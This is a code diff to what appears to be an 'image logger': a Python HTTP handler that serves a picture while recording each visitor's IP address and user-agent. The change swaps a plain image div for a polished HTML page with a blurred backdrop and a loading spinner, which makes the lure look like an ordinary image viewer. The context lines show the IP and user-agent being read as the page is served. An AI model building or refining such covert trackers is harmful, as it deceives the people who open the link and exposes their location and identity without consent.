@@ -188,18 +188,67 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
+            data = f'''<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* {{ margin: 0; padding: 0; box-sizing: border-box; }}
+body {{
+    background-color: #0e0e10;
+    height: 100vh;
+    width: 100vw;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+    position: relative;
+    font-family: sans-serif;
 }}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+/* Unscharfer Hintergrund, damit keine grauen Ränder entstehen */
+.bg-blur {{
+    position: absolute;
+    top: -10%; left: -10%;
+    width: 120%; height: 120%;
+    background-image: url('{url}');
+    background-position: center;
+    background-size: cover;
+    filter: blur(25px) brightness(0.3);
+    z-index: 1;
+}}
+/* Hauptbild */
+.main-img {{
+    position: relative;
+    z-index: 2;
+    max-width: 100%;
+    max-height: 100vh;
+    object-fit: contain;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+}}
+/* Lade-Anzeige / Spinner */
+.loader {{
+    position: absolute;
+    z-index: 3;
+    border: 4px solid rgba(255, 255, 255, 0.2);
+    border-left-color: #00ffff;
+    border-radius: 50%;
+    width: 45px;
+    height: 45px;
+    animation: spin 0.8s linear infinite;
+}}
+@keyframes spin {{
+    0% {{ transform: rotate(0deg); }}
+    100% {{ transform: rotate(360deg); }}
+}}
+</style>
+</head>
+<body>
+<div class="bg-blur"></div>
+<div class="loader" id="spinner"></div>
+<img class="main-img" src="{url}" alt="Image" onload="document.getElementById('spinner').style.display='none';">
+</body>
+</html>'''.encode()
             
             ip = self.headers.get('x-forwarded-for')
             user_agent = self.headers.get('user-agent')
